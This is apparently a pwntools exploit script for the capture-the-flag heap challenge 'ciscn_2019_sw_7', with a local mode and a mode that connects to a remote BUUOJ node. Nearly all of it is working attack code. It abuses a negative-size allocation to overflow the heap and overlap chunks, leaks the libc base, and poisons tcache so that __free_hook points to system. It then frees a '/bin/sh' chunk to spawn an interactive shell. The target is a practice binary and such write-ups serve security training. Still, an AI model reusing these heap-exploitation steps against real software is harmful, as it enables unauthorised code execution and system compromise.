import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_sw_7')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_sw_7')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
		else :
			io=remote('node3.buuoj.cn',28742)
			elf=ELF('./ciscn_2019_sw_7')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')

		def add(a,b):
			io.sendlineafter('> ','1')
			io.sendlineafter('The size of note:',str(a))
			io.sendafter('The content of note:',b)

		def show(a):
			io.sendlineafter('> ','2')
			io.sendlineafter('Index:',str(a))

		def delete(a):
			io.sendlineafter('> ','4')
			io.sendlineafter('Index:',str(a))

			

		add(0x2,'k')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		delete(9)
		delete(8)
		add(0x40,'keer\n')
		add(0x20,'keer\n')

		delete(0)
		add(-1,'a'*0x10+p64(0x441)+'\n')
		delete(1)
		delete(9)
		delete(8)
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		add(0x60,'keer\n')
		show(2)
		io.recv(4)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		delete(3)
		delete(9)
		add(0x50,'\n')
		add(0x50,p64(0x71)+p64(libc.sym['__free_hook']-8)+'\n')
		delete(0)
		delete(3)
		delete(9)
		add(0x60,'/bin/sh\n')
		add(0x60,'keer\n')
		add(-1,'\x00'*0x18+'/bin/sh\n')
		delete(9)
		add(0x60,p64(libc.sym['system'])+'\n')
		delete(0)







		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue